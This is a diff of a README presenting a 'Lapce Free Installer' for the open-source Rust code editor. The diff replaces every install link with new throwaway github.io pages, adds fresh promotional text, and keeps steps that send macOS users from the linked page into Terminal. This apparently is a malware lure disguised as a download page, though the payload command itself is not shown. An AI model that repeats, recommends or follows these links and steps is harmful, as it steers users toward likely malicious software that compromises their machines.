@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Code+Editor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Lapce Free Installer** — Lapce is a fast, open-source code editor written in Rust, designed for performance and modern developer workflows. Works without internet access, no account required. Full offline installation.
+**💻 Lapce Free Installer** — Lapce is a free, open-source, GPU-accelerated code editor written in Rust for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Lapce
 
-Lapce is a fast, open-source code editor written in Rust, designed for performance and modern developer workflows. Features GPU-accelerated rendering, a built-in terminal, native LSP support for any programming language, remote development over SSH, and a Vim-inspired modal editing mode. Lapce aims to deliver VS Code-level features with significantly faster performance.
+Lapce is a free, open-source, GPU-accelerated code editor written in Rust for Windows, macOS, and Linux. Designed for extreme performance, it features Vi/modal editing, LSP integration, remote development, and a plugin system — aiming to be faster than VS Code.
 
 ---
 
 ## ❌ Problem: Lapce is hard to access
 
-- **Early Development** — Project still in beta; some features incomplete or unstable
-- **Plugin Ecosystem** — Much smaller than VS Code extension marketplace
-- **Documentation** — Some advanced features lack comprehensive documentation
-- **Compatibility** — Some edge cases in language server behavior still being resolved
+- **Early Development** — Still in beta; some features and stability not at production level
+- **Limited Plugin Ecosystem** — Plugin library significantly smaller than VS Code
+- **Modal Editing Required** — Vi-inspired modal editing has a learning curve
+- **Incomplete Features** — Some planned features still under development
 
 ---
 
@@ -61,9 +61,9 @@ Lapce is a fast, open-source code editor written in Rust, designed for performan
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Lapce is a fast, open-source code editor written in Rust, designed for performan
 
 <div align="center">
 
-[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Lapce is a fast, open-source code editor written in Rust, designed for performan
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Lapce is a fast, open-source code editor written in Rust, designed for performan
 
 ---
 
-**Lapce Free Installer** — Lapce is a fast, open-source code editor written in Rust, designed for performance and modern developer workflows. Install without internet connection today!
+**Lapce Free Installer** — Lapce is a free, open-source, GPU-accelerated code editor written in Rust for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Lapce](https://img.shields.io/badge/⬇_Install_Lapce-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
